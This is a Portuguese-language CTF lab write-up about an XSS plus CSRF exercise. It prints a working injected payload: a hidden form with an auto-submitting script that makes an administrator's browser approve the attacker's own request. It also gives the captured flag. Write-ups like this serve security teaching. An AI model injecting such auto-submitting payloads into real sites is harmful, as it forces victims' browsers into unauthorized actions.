# LOGBOOK6 - CTF - XSS + CSRF
<div align="justify">
<p>Neste CTF, ao entrar no site mencionado, deparamo nos com uma caixa de texto na qual podemos inserir qualquer tipo de conteúdo, e o administrador fornecerá a flag dependendo do input. Para analisar o que acontece no site, inserimos um texto e observamos que há uma página com um formulário onde o administrador decide se o input enviado é aceitável (fornecendo assim a flag) ou não.
Com isso em mente, pensamos que poderia ser possível inserir um formulário idêntico ao que o administrador tinha acesso, mas com um 'script' que 'forçasse' o administrador a aceitar o que era enviado.
Analisando o código-fonte da página, verificamos que o 'formulário' que precisa de ser enviado, fornecendo a flag, possui o seguinte código:</p>
</div>

```html
<form method="POST" action="/request/6b14dc9c65f712d891dfffadbfcec3d631d032d4/approve" role="form">
    <div class="submit">
        <input type="submit" id="giveflag" value="Give the flag" disabled="">
    </div>
</form>
```
Assim, para que o formulário seja 'submited' automaticamente, inserimos o seguinte 'script' no nosso input:
```html
<script>document.getElementById('fake_id').submit()</script>  
<!-- O fake_id é o id colocado no 'form' que foi colocado no input -->
```
Com isso, o 'input' que enviamos foi o seguinte:
```html
<form method="POST" id='fake_id' action="http://ctf-fsi.fe.up.pt:5005/request/6b14dc9c65f712d891dfffadbfcec3d631d032d4/approve" role="form">
    <div class="submit">     
        <input type="submit">
    </div> 
</form> 
<script>document.getElementById('fake_id').submit()</script>  
```
<div align="justify">
<p>Após o envio do nosso formulário, a página é recarregada, mostrando a flag, embora esta seja redirecionada para outra página quase instantaneamente. Portanto, para obtermos a flag, assim que enviamos a nossa resposta, pressionamos o botão 'parar' para evitar o redirecionamento automático, conseguindo então obter a flag: flag{0d190349a6f060ce425ee7ce5b35f00f}.</p>
</div>
